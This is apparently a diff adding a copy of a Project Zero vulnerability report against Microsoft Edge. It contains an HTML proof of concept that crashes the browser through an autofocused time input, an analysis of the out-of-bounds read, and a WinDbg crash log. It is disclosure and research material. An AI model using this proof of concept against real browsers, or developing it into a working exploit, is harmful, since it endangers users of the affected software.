@@ -1,0 +1,74 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1264
+
+The vulnerability has been confirmed on Windows 10 Enterprise 64-bit (OS version 1607, OS build 14393.1198) and Microsoft Edge 38.14393.1066.0, Microsoft EdgeHTML 14.14393.
+
+PoC:
+
+==========================================
+-->
+
+<!-- saved from url=(0014)about:internet -->
+<style>
+input:focus { transform: scale(10); }
+</style>
+<input autofocus="autofocus" type="time">
+
+<!--
+=========================================
+
+Preliminary analysis:
+
+CInputDateTimeScrollerElement::_SelectValueInternal calls CInputDateTimeScrollerElement::_UpdateSelected with a pointer that is obtained from an array, approximately:
+
+CInputDateTimeScrollerElement::_SelectValueInternal(...) {
+  ...
+  this->_UpdateSelected(this->array_at_offset_0xB8[this->index_at_offset_0xD4].ptr_at_index_0, ...);
+  ...
+}
+
+The problem is that the index in the PoC has unsigned 32-bit value of 0xffffffff, possibly because the data structure has not been properly initialized, which leads to out-of-bound access. If an attacker can put data they control at array+offset, they would be able to call this->_UpdateSelected with a controlled argument, which presumably would be sufficient to turn this into a write primitive.
+
+Crash log:
+
+=========================================
+
+(1afc.1b94): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+edgehtml!CInputDateTimeScrollerElement::_SelectValueInternal+0x57:
+00007ffd`625b3903 488b14ca        mov     rdx,qword ptr [rdx+rcx*8] ds:00000290`617a5788=????????????????
+
+0:013> k
+ # Child-SP          RetAddr           Call Site
+00 00000086`73dfcee0 00007ffd`625b2f87 edgehtml!CInputDateTimeScrollerElement::_SelectValueInternal+0x57
+01 00000086`73dfcf30 00007ffd`61f952b7 edgehtml!CInputDateTimeScrollerElement::OnScroll+0xb7
+02 00000086`73dfcf60 00007ffd`61e8fc58 edgehtml!CAsyncEventQueue::DispatchAllEvents+0x9b
+03 00000086`73dfcfd0 00007ffd`61e8fc12 edgehtml!CDoc::ProcessPaintBeatEventQueue+0x38
+04 00000086`73dfd000 00007ffd`61e22c42 edgehtml!CPaintController::ProcessPaintBeatEventQueue+0x12
+05 00000086`73dfd030 00007ffd`61e22aee edgehtml!CPaintBeat::OnBeat+0xf2
+06 00000086`73dfd080 00007ffd`61ed5eb3 edgehtml!CPaintBeat::OnVSyncMethodCall+0x5e
+07 00000086`73dfd0b0 00007ffd`61ed7670 edgehtml!GlobalWndOnMethodCall+0x273
+08 00000086`73dfd1b0 00007ffd`7e0a1c24 edgehtml!GlobalWndProc+0x130
+09 00000086`73dfd270 00007ffd`7e0a156c user32!UserCallWinProcCheckWow+0x274
+0a 00000086`73dfd3d0 00007ffd`5bc0d421 user32!DispatchMessageWorker+0x1ac
+0b 00000086`73dfd450 00007ffd`5bc0c9e1 EdgeContent!CBrowserTab::_TabWindowThreadProc+0x4a1
+0c 00000086`73dff6a0 00007ffd`705d9586 EdgeContent!LCIETab_ThreadProc+0x2c1
+0d 00000086`73dff7c0 00007ffd`7ec28364 iertutil!_IsoThreadProc_WrapperToReleaseScope+0x16
+0e 00000086`73dff7f0 00007ffd`7ed970d1 KERNEL32!BaseThreadInitThunk+0x14
+0f 00000086`73dff820 00000000`00000000 ntdll!RtlUserThreadStart+0x21
+
+0:013> r
+rax=00000000ffffffff rbx=000002786177d770 rcx=00000002fffffffd
+rdx=00000278617a57a0 rsi=0000027054093eb8 rdi=00000000ffffff00
+rip=00007ffd625b3903 rsp=0000008673dfcee0 rbp=0000000000000001
+ r8=000000000a028001  r9=00007ffd6295a4a0 r10=00000fffac3bb648
+r11=0000000000000100 r12=0000000000000004 r13=0000000000000002
+r14=00000278617f55b0 r15=0000000000000004
+iopl=0         nv up ei pl nz na pe nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
+edgehtml!CInputDateTimeScrollerElement::_SelectValueInternal+0x57:
+00007ffd`625b3903 488b14ca        mov     rdx,qword ptr [rdx+rcx*8] ds:00000290`617a5788=????????????????
+
+=========================================
+-->
